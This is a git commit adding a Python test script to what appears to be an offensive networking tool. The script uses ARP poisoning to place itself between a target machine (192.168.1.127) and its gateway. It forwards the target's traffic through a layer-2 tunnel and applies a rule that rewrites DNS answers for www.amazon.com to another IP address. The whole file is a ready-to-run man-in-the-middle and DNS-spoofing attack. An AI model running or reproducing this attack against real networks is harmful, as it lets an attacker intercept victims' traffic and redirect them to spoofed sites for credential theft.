99c4d3cb9cc1b1d2d76b2749070c55a57a68dc79
jake <jake.feiglin@gmail.com>
2020-03-18 19:59:09 +0200

    added proper ip checks to l2tunnel, quality of life changes to network headers. Added the disruption rules interface to the l2tunnel, and a file of disruption rules

---
+++ test_tunneler.py
@@ -0,0 +1,37 @@
+from tunneler.tunneler import *
+from arp_poison.mitm import MITMService
+import disruption_rules
+
+
+
+
+def main():
+    my_mac = b'\x08\x2e\x5f\x73\xdd\xef'
+    target_mac = b'\x00\x1e\x64\x76\xbc\xd4'
+    gateway_mac = b'\x30\x24\x78\xc0\x52\x84'
+
+    target = '192.168.1.127'
+    gateway = '192.168.1.1'
+
+    disrupt_dns_rule = disruption_rules.change_dns_responses('www.amazon.com', '104.16.41.71')
+
+    mitm = MITMService(target_ip=target, gateway_ip=gateway, interval=0.5)
+    tunnel = L2Tunnel(target_mac=target_mac, gateway_mac=gateway_mac, my_mac=my_mac, target_ip=target, interface='eno1')
+
+    tunnel.add_disruption_rule(4, disrupt_dns_rule)
+
+    tunnel.start_forward_thread()
+    mitm.start_mitm()
+
+    try:
+        while True:
+            pass
+    except KeyboardInterrupt:
+        tunnel.stop_forward_thread()
+        mitm.stop_mitm()
+
+
+
+
+if __name__ == '__main__':
+    main()
